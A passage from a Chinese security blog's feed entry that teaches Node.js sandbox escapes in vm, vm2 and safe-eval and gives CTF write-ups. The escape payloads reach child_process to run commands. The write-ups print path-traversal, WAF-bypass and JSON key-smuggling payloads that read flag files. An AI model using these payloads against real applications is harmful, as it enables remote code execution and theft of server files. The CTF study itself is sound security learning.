context 对象。<br><strong>contextify 语境化</strong><br> 根据 V8 引擎的文档指明：  </p><pre><code class="plsql">在 V8 中，context 是一个执行环境，它允许在隔离的、无关联的一个 V8 实例中运行 JavaScript 应用。你必须为运行的任何JavaScript代码指定所应该处于的 context。</code></pre><p>vm.createContext() 有一个 contextobject 参数，用于接收一个对象（如果没有，就在模块内部创建一个），所谓语境化就是创建一个 context（对象） 然后传入 contextObject 作为代码执行环境的过程。  </p><h2 id="vm逃逸"><a href="#vm逃逸" class="headerlink" title="vm逃逸"></a>vm逃逸</h2><p>vm创建一个新的 context 执行 JavaScript 代码，不能访问 global 对象，看起来就像一个沙箱了。<br>例如我们想要访问 process：</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`process`);   // 默认 context = &#123;&#125;console.log(xyz);</code></pre><p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612046837-5f634418-9837-44b2-8968-28bd67220a43.png" alt="image.png"><br> 预料之中，因为 process 不存在于新的 context，它存在于原来的 context 中，而原来的 context 的 global 对象有 process 属性：  </p><pre><code class="plsql">&quot;use strict&quot;;console.log(process)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612137486-e997e313-634b-40f6-92dc-5af7e767d1a5.png" alt="image.png"><br> 通过对象带有的 constructor 属性逃逸:</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`);console.log(xyz);  // xyz的值为最后一句JavaScript代码执行的结果，这里是函数返回值</code></pre><p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612256209-e86817c0-1c5a-441b-91e3-69fb1f2f9b16.png" alt="image.png"><br>this引用的是当前所在的一个对象，这里是传入 contextObject 的对象，它在外部定义，所以它属于外部的 context。通过 .constructor 得到 Object Contrustor ，再通过 .constructor 得到 Function constructor，这是函数的构造函数，通过传入一个包含代码的字符串参数就能创建一个新的函数，最后的 () 就是调用这个函数。<br>获得 process 之后就能 RCE 了。</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ipconfig&#39;).toString()`);console.log(xyz);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612373997-17575d9f-dd72-4406-872f-4ce4841a9ce2.png" alt="image.png"></p><h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>nodejs.js 内置的 vm 模块提供的沙箱环境的隔离程度不高，因此最好不要执行不受信任的代码，这一点在node.js文档中明确指出。<br>vm2是一个第三方模块，基于vm模块、Proxy特性、require重写来实现，能提供隔离程度更高的沙箱。<br> vm的例子在vm2运行：  </p><pre><code class="plsql">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);new VM().run(&#39;this.constructor.constructor(&quot;return process&quot;)()&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668613759546-ed42fac1-20b3-4915-adf8-5411de5170cd.png" alt="image.png"><br> 这次通过 this.constructor.constructor 也不能获取 process 了。这是由于 vm2 语境化了在 vm context 中的所有对象，.constructor指向的构造函数并不是外部的 context 。  </p><pre><code class="plsql">// vm&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor`);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor);       // true// vm2&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const xyz = new VM().run(&#39;this.constructor.constructor&#39;);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor)        // false</code></pre><p><strong>vm2逃逸思路</strong><br>逃逸的思路：我们需要一些沙箱外的东西，它不在沙箱 context 的限制范围内，通过它就能再次访问 constructor 。<br>**1.异常处理机制 try catch 就能做到这一点，主进程在 try 抛出异常，然后在 catch 捕获 error 对象，通过这个 error 对象引用到 process **</p><pre><code>vm2 将该漏洞已修复</code></pre><pre><code class="plsql">const &#123;NodeVM&#125; = require(&#39;vm2&#39;); nvm = new NodeVM()nvm.run(`    try &#123;        this.process.removeListener();     &#125;     catch (host_exception) &#123;        console.log(&#39;host exception: &#39; + host_exception.toString());        // 通过 error 对象引用        host_constructor = host_exception.constructor.constructor;        host_process = host_constructor(&#39;return this&#39;)().process;    child_process = host_process.mainModule.require(&quot;child_process&quot;);    console.log(child_process.execSync(&quot;whoami&quot;).toString());    &#125;`);</code></pre><p> 结果：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614464966-61b06bd9-ccc9-432f-9bd1-670748257f0b.png" alt="668e27f4a4304458a6644938470fe5dc.png"><br>其他得一些payload</p><pre><code class="plsql">var handler = &#123;    get () &#123;     console.log(&quot;get&quot;);    &#125;  &#125;;var target = &#123;&#125;;var proxy = new Proxy(target, handler);Object.prototype.has = function(t, k)&#123;    console.log(&quot;has&quot;);&#125;proxy.a; //触发get&quot;&quot; in proxy; //触发has，这个has是在原型链上定义的w</code></pre><p>========================================</p><pre><code class="plsql">&quot;use strict&quot;;var process;Object.prototype.has = function (t, k) &#123;    process = t.constructor(&quot;return process&quot;)();&#125;;&quot;&quot; in Buffer.from;process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre><h2 id="safe-eval模块逃逸"><a href="#safe-eval模块逃逸" class="headerlink" title="safe-eval模块逃逸"></a>safe-eval模块逃逸</h2><p> safe-eval 第三方模块基于内置模块 vm 实现，可以用于执行 JavaScript 代码，默认能访问 V8 引擎的 JavaScript APIs，而不能访问 node.js 的 APIs，但通过传入 context 也能实现对它们的访问。  </p><pre><code class="plsql">safeEval(code, [context], [options])</code></pre><p> context 是一个包含属性和方法的对象，这些方法和属性从全局，所以要注意传入的属性和方法，否则会造成沙箱逃逸。<br> 在 version &lt;= 0.3.0 中，safe-eval 存在沙箱逃逸的漏洞：  </p><pre><code class="plsql">&gt;npm i safe-eval@0.3.0</code></pre><pre><code class="plsql">// test.jsconst safeEval = require(&#39;safe-eval&#39;)var code = `    this.constructor.constructor(&#39;return process&#39;)()`var evaluated = safeEval(code)console.log(evaluated)            // process [....]</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614691540-a0071ffe-52e2-41b4-9ac6-dfceedfa45e5.png" alt="image.png"><br> 0.4.0 的修补方法是将对象的 constructor 重新定义为 undefined，包括在 context 传入的对象：  </p><pre><code class="plsql">const safeEval = require(&#39;safe-eval&#39;)var code = &#39;this.constructor&#39;var evaluated = safeEval(code)      console.log(evaluated)             // undefinedvar code = &#39;a&#39;var evaluated2 = safeEval(code, &#123;a:&#123;&#125;)console.log(evaluated2)           // &#123;constructor: undefined&#125;</code></pre><p><strong>safe-eval  1.3.6  版本逃逸</strong></p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>payload:</p><pre><code class="plsql">(function () &#123;const process = clearImmediate.constructor(&quot;return process;&quot;)();return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()&#125;)()</code></pre><h2 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h2><h3 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h3><p>链接:<a href="https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode">https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode</a><br>这里使用docker搭建<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763162126-19b5e964-48f5-4b5f-a4a4-26f95a1993e8.png" alt="image.png"></p><p>我们查看下源代码:</p><pre><code class="plsql">const express = require(&#39;express&#39;);const bodyParser = require(&#39;body-parser&#39;);const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库const fs = require(&#39;fs&#39;);const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 老板说为了后期方便优化app.use((req, res, next) =&gt; &#123;  if (req.path === &#39;/eval&#39;) &#123;    let delay = 60 * 1000;    console.log(delay);    if (Number.isInteger(parseInt(req.query.delay))) &#123;      delay = Math.max(delay, parseInt(req.query.delay));    &#125;    const t = setTimeout(() =&gt; next(), delay);    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事    setTimeout(() =&gt; &#123;      clearTimeout(t);      console.log(&#39;timeout&#39;);      try &#123;        res.send(&#39;Timeout!&#39;);      &#125; catch (e) &#123;      &#125;    &#125;, 1000);  &#125; else &#123;    next();  &#125;&#125;);app.post(&#39;/eval&#39;, function (req, res) &#123;  let response = &#39;&#39;;  if (req.body.e) &#123;    try &#123;      response = saferEval(req.body.e);    &#125; catch (e) &#123;      response = &#39;Wrong Wrong Wrong!!!!&#39;;    &#125;  &#125;  res.send(String(response));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#39;/source&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.js&#39;));&#125;);// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口app.get(&#39;/version&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./package.json&#39;));&#125;);app.get(&#39;/&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.html&#39;))&#125;)app.listen(80, &#39;0.0.0.0&#39;, () =&gt; &#123;  console.log(&#39;Start listening&#39;)&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763320589-54653302-1df5-408b-ba38-b77bdd27a991.png" alt="image.png"><br>在这段代码中存在safe-eval，我们查看下它得版本<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763363493-222cc8a3-42df-4e25-8f16-326a1bbc6154.png" alt="image.png"><br>1.3.6是存在漏洞的<br>我们先继续分析代码:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668771592322-95094a63-cbd9-4ada-a453-3c86ee7b6c50.png" alt="image.png"><br> 通过/eval?delay=上传一个数字并和60000比较，大的赋值给delay  </p><pre><code class="plsql">setTimeout最多只能推迟执行2147483647毫秒（24.8天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行</code></pre><p> 我们传入一个大于2147483647的值即可执行next()到下一个位置<br>所以我们就可以通过get传入一个比2147483647大的值，然年使用post方式传入payload<br>safer-eval 1.3.6逃逸payload:</p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>在这里我们直接给e post传入一下内容:</p><pre><code class="plsql">(function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;)()</code></pre><p>搭建的docker环境不知道为什么没有成功执行命令，放一张别人的图叭<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668772542204-bf8936f4-0bf2-48b7-9fe6-112ba4a93c59.png" alt="o_20080607581121-1.png"></p><h2 id="更多逃逸payload"><a href="#更多逃逸payload" class="headerlink" title="更多逃逸payload"></a>更多逃逸payload</h2><p><a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a><br><a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p><h1 id="一些有趣的挑战"><a href="#一些有趣的挑战" class="headerlink" title="一些有趣的挑战"></a>一些有趣的挑战</h1><h2 id="CSIVITU-2020-File-Library"><a href="#CSIVITU-2020-File-Library" class="headerlink" title="CSIVITU 2020-File Library"></a>CSIVITU 2020-<strong>File Library</strong></h2><p>容器地址:<a href="https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library">https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library</a><br>我们得到了任务的源代码：</p><pre><code class="javascript">const express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const app = express();const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123;   console.log(`Listening on port $&#123;PORT&#125;`);&#125;);app.get(&#39;/getFile&#39;, (req, res) =&gt; &#123;   let &#123; file &#125; = req.query;   console.log(&quot;file is: &quot;+file);   if (!file) &#123;       res.send(`file=$&#123;file&#125;\nFilename not specified!`);       return;   &#125;   try &#123;       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) &#123;           res.send(`file=$&#123;file&#125;\nInvalid filename!`);           return;       &#125;   &#125; catch (err) &#123;       res.send(&#39;An error occured!&#39;);       return;   &#125;   if (!allowedFileType(file)) &#123;       res.send(`File type not allowed`);       return;   &#125;   if (file.length &gt; 5) &#123;       file = file.slice(0, 5);   &#125;   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);  console.log(&quot;returnedFile: &quot;+returnedFile);   fs.readFile(returnedFile, (err) =&gt; &#123;       if (err) &#123;           if (err.code != &#39;ENOENT&#39;) console.log(err);           res.send(&#39;An error occured!&#39;);           return;       &#125;       res.sendFile(returnedFile);   &#125;);&#125;);app.get(&#39;/*&#39;, (req, res) =&gt; &#123;   res.sendFile(__dirname + &#39;/index.html&#39;);&#125;);function allowedFileType(file) &#123;   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);console.log(&quot;index +1 is &quot;+file.indexOf(&#39;.&#39;) + 1);    console.log(&quot;format inside allowedfile is: &quot;+format);   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;       return true;   &#125;   return false;&#125;</code></pre><p>我添加了一些日志记录语句以方便操作，正如您所见，当我们访问**/getfile**时，我们可以在 get 参数中提供一个将为我们显示的文件名，但有一些限制，我们不能使用空格或“/”，只允许四个扩展名 (js|ts|c|cpp) 。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668851120660-015dd3fc-8e23-42ce-86ae-08e0a10ec78c.png" alt="image.png"><br>仔细阅读源代码后，我很确定我们会使用 http 参数污染，因为没有检查 get 参数的类型，所以我们可以输入一个数组并尝试利用可能发生的不当行为。<br>假设我们输入以下数组：</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]</code></pre><ul><li><strong>第一次检查</strong>：if (file.includes(‘ ‘) || file.includes(‘/‘))</li></ul><p>当 includes 应用于数组时，它会检查是否有一个字段等于传递的参数（在我们的例子中为“”和“/”），这里为 false，因此我们可以成功通过此检查</p><ul><li><strong>第二次检查</strong>：if (!allowedFileType(file))</li></ul><p>我们来看看这个函数的代码：</p><pre><code class="javascript">function allowedFileType(file) &#123;const format = file.slice(file.indexOf(&#39;.&#39;) + 1);    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;        return true;    &#125;    return false;&#125;</code></pre><p>它将从 indexOf(“.”)+1 开始对我们的数组进行切片，所以在我们的例子中，结果将是我们数组的最后一个字段，即“js”，我们也将通过此检查：<br>以下行将删除数组的最后两个字段：</p><pre><code class="javascript">if (file.length &gt; 5) &#123;  file = file.slice(0, 5);&#125;# &quot;Welcome to GeeksforGeeks&quot;.slice(0, 5)  ---&gt; Welcom</code></pre><p>所以我们的数组将变成：</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;]</code></pre><p>最后在解析路径后 returnedFile 将包含 /proc/self/cwd/flag.txt</p><pre><code class="javascript">const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);</code></pre><p><strong>注意：</strong>由于我们的“../../”字段，当前目录的__dirname 被忽略，而**/proc/self/cwd**等同于当前目录。<br>所以最后我们的数组将被解析为我们想要的路径，这是最终的有效载荷，它只是对我们之前所说的的一种解释：</p><pre><code class="javascript">http://chall.csivit.com:30222/getfile?file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../proc/self/cwd/flag.txt&amp;file[]=.&amp;file[]=js</code></pre><h2 id="corCTF2022-a-simple-waf"><a href="#corCTF2022-a-simple-waf" class="headerlink" title="corCTF2022 a simple waf"></a>corCTF2022 a simple waf</h2><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935506091-1813cc21-6778-4925-9957-d8eec87bba05.png"><br>挑战为我们提供了<a href="https://github.com/thangpd3160/CTF-Writeup/tree/main/corCTF/2022/simplewaf">源代码</a>和一个Dockerfile. 由于 Instancer 只创建一个持续 3 分钟的挑战实例，这非常不方便，所以我使用提供的资源在本地构建和调试以玩这个挑战。<br>浏览网站localhost:3456，我们可以看到这只是一个简单的网页展示指定文件的内容。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935640897-81cac506-2e2f-4d19-ac63-515f73604c5d.png" alt="image.png"><br>这个挑战的目标是读取flag.txt文件的内容……但以某种方式绕过includes(‘flag’)waf的检查。所有的挑战代码都可以在 看到main.js</p><pre><code class="javascript">const express = require(&quot;express&quot;);const fs = require(&quot;fs&quot;);const app = express();const PORT = process.env.PORT || 3456;app.use((req, res, next) =&gt; &#123;    if([req.body, req.headers, req.query].some(        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)    )) &#123;        return res.send(&quot;bad hacker!&quot;);    &#125;    next();&#125;);app.get(&quot;/&quot;, (req, res) =&gt; &#123;    try &#123;        res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);        res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());           &#125;    catch(err) &#123;        console.log(err);        res.status(500).send(&quot;Internal server error&quot;);    &#125;&#125;);app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port $&#123;PORT&#125;`));</code></pre><p><strong>分析</strong><br>阅读源代码后，我想到了两个问题。</p><ol><li>如何绕过includes条件？（绝对……我们正在寻找的东西），以及</li><li>readFileSync该函数可以采用什么类型的参数来读取文件？</li></ol><p>通过在 Google 上搜索，我发现了一篇关于<a href="https://ahmed-belkahla.me/post/csictf2020/">NodeJS Bypass Filter CTF</a>的文章，它在某些时候类似于这个挑战：</p><ul><li>这两个挑战都没有验证输入的类型，这意味着我们可以将输入作为数组而不是字符串传递，并且</li><li>这两个挑战都需要绕过includes函数才能到达标志！</li></ul><p>太棒了！认为我找到了正确的位置，我尝试了 payload file[]=x&amp;file[]=flag.txt。不幸的是，它无法绕过这个挑战的waf<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935762043-fff8116b-850a-4c5a-bdcd-db5e94a0d1a8.png" alt="image.png"><br>为什么它不能绕过waf？好吧，我发现这行代码的挑战之间有一个关键的不同点<br>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(“flag”)<br>simplewaf不采用原始输入来执行输入验证，而是预先将原始输入转换为 JSON 字符串<strong>。</strong>因此，该includes函数仍然可以检查转换后的字符串是否包含flag。<br>至此，我无论如何也想不出绕过这个includes函数……所以，我转到第二个问题，看看那个函数的NodeJS文档。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789510-8354252a-f6cc-463c-b632-bb7e60a1a1de.png" alt="image.png"><br>好的，所以路径参数可以是一个<string> | <Buffer> | <URL> | <integer>. 但是，请求查询值的类型始终是字符串。我们如何传入readFileSync函数 aURL或 aninteger或 a 以外的任何其他内容string？<br>起初想到，我尝试将字符串格式化为URL: <a href="http://localhost:3456/wow.html%E3%80%82%E5%80%92%E9%9C%89%EF%BC%8C%E4%B8%8D%E8%A1%8C">http://localhost:3456/wow.html。倒霉，不行</a>~</integer></URL></Buffer></string></p><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png" alt="image.png"><br>停止徒劳的猜测，我决定在<a href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">github</a>readFileSync上的 NodeJS 源代码中仔细查看该功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789036-6b7a5233-e982-4190-aaae-0a8ffc5c9972.png" alt="image.png"><br>第 469 行及以下的代码片段执行读取文件过程，无需深入研究。我们需要深入研究的要点是第 467 行的代码。通过研究fs.openSync函数来跟踪代码。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788506-b6f91f83-3bd6-43ed-ab40-d21fb43b860d.png" alt="image.png"><br>通过调查getValidatedPath功能继续关注。</p><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788081-009143b9-094b-470d-b9c8-36f6f3ec9a1c.png" alt="image.png"><br>按住不放，这里会出现一些有趣的东西。因此，如果该fileURLOrPath值不为 null，并且其中有 existshref和origin，它将调用 to fileURLToPath，将fileURLOrPath值转换为 URL。这就是我想说的！我能感觉到我走的路是对的！<br>获得动力，我继续研究这个fileURLToPath功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935794727-c8ad1160-3801-48c0-b0d0-625d21dc379a.png" alt="image.png"><br>该值的一个附加条件fileURLOrPath是其协议必须是file:. 全部检查通过后，会调用相应的函数从URL中获取路径。由于我在 Linux 上调试，所以我继续研究该getPathFromURLPosix功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935795561-c49c1cd2-acc0-46b6-85c4-db4ded4c9806.png" alt="image.png"><br>再次检查此代码片段：hostname必须为空。但是，这里需要注意一件值得注意的事情，它将帮助我们绕过 simplewaf 的includes检查，那就是它将对<strong>simplewaf</strong>pathname执行 URL 解码以获取 URL。这意味着如果我们pathname从 Web 应用程序传递一个双 URL 编码值，它最终将文件路径变成纯文本。你猜怎么着？由于客户端传递给includes检查的值只是 URL 解码一次，我们也可以轻松绕过此检查。<br>好的，让我们总结一下将有效参数file作为 URL传递给函数readFileSync需要做的所有事情。</p><ul><li>file不为空</li><li>file.origin存在</li><li>file.href存在</li><li>file.protocol = ‘file:’</li><li>file.hostname = ‘’</li></ul><p>绕过waf并获得标志的最终要求是：</p><ul><li>file.pathname是双重 URL 编码</li></ul><p><strong>解决方案</strong><br>根据上面的分析，我构造了如下的payload：<br>file[origin]=x&amp;file[href]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fla%2567.txt<br>我只是对字符进行双重 URL 编码g以绕过 waf。使用有效载荷，我们成功获得了测试标志。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935796021-c337cfb2-2659-429c-aa5d-94fee9e55d4d.png" alt="image.png"><br>好吧，先拿真旗吧~<br>corctf{hmm_th4t_waf_w4snt_s0_s1mple}</p><h2 id="祥云杯2022-RUSTwaf"><a href="#祥云杯2022-RUSTwaf" class="headerlink" title="祥云杯2022 RUSTwaf"></a>祥云杯2022 RUSTwaf</h2><pre><code class="javascript">const express = require(&#39;express&#39;);const app = express();const bodyParser = require(&quot;body-parser&quot;)const fs = require(&quot;fs&quot;)app.use(bodyParser.text(&#123;type: &#39;*/*&#39;&#125;));const &#123;  execFileSync &#125; = require(&#39;child_process&#39;);app.post(&#39;/readfile&#39;, function (req, res) &#123;    let body = req.body.toString();    let file_to_read = &quot;app.js&quot;;    const file = execFileSync(&#39;/app/rust-waf&#39;, [body], &#123;        encoding: &#39;utf-8&#39;    &#125;).trim();    try &#123;        file_to_read = JSON.parse(file)    &#125; catch (e)&#123;        file_to_read = file    &#125;    let data = fs.readFileSync(file_to_read);    res.send(data.toString());&#125;);app.get(&#39;/&#39;, function (req, res) &#123;    res.send(&#39;see `/src`&#39;);&#125;);app.get(&#39;/src&#39;, function (req, res) &#123;    var data = fs.readFileSync(&#39;app.js&#39;);    res.send(data.toString());&#125;);app.listen(3000, function () &#123;    console.log(&#39;start listening on port 3000&#39;);&#125;);</code></pre><p>直接/readfile读源码</p><pre><code class="javascript">use std::env;use serde::&#123;Deserialize, Serialize&#125;;use serde_json::Value;static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;#[derive(Debug, Serialize, Deserialize)]struct File&#123;    #[serde(default = &quot;default_protocol&quot;)]    pub protocol: String,    pub href: String,    pub origin: String,    pub pathname: String,    pub hostname:String&#125;pub fn default_protocol() -&gt; String &#123;    &quot;http&quot;.to_string()&#125;//protocol is default value,can&#39;t be customizedpub fn waf(body: &amp;str) -&gt; String &#123;    if body.to_lowercase().contains(&quot;flag&quot;) ||  body.to_lowercase().contains(&quot;proc&quot;)&#123;        return String::from(&quot;./main.rs&quot;); //这里限制我们不能带有flag和proc字段    &#125;    if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;        if let Some(json_body_obj) = json_body.as_object() &#123;            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;                return String::from(&quot;./main.rs&quot;);    //这里限制我们的json字段不能带有protocol字段，但是下面限制我们是file结构体，这也就意味着我们一定要有protocol字段            &#125;        &#125;        //not contains protocol,check if struct is File        if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) &#123;//限制我们只能是这个结构体            return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;));        &#125;    &#125; else&#123;        //body not json        return String::from(body);    &#125;    return String::from(&quot;./main.rs&quot;);&#125;fn main() &#123;    let args: Vec&lt;String&gt; = env::args().collect();    println!(&quot;&#123;&#125;&quot;, waf(&amp;args[1]));  //这里把json的第二字段传进去&#125;</code></pre><p>将payload以json格式传，但是这里用到的payload中存在protocol导致rust能检测到，要利用unicode 绕过<br>最终payload：</p><pre><code class="javascript">&#123;&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/fl%61g&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;origin&quot;:&quot;fuckyou&quot;,&quot;pr\ud800otocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;fuckyou&quot;&#125;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/shawdow_bug/article/details/120072209">https://blog.csdn.net/shawdow_bug/article/details/120072209</a><br><a href="https://xz.aliyun.com/t/11791#toc-8">https://xz.aliyun.com/t/11791#toc-8</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Nodejs语言特性&quot;&gt;&lt;a href=&quot;#Nodejs语言特性&quot; class=&quot;headerlink&quot; title=&quot;Nodejs语言特性&quot;&gt;&lt;/a&gt;Nodejs语言特性&lt;/h1&gt;&lt;h2 id=&quot;大小写特性&quot;&gt;&lt;a href=&quot;#大小写特性&quot; class=&quot;he</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="node_js" scheme="https://sakurahack-y.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>php原生类学习</title>
    <link href="https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-20T03:27:20.000Z</published>
    <updated>2022-11-19T17:57:35.691Z</updated>
    
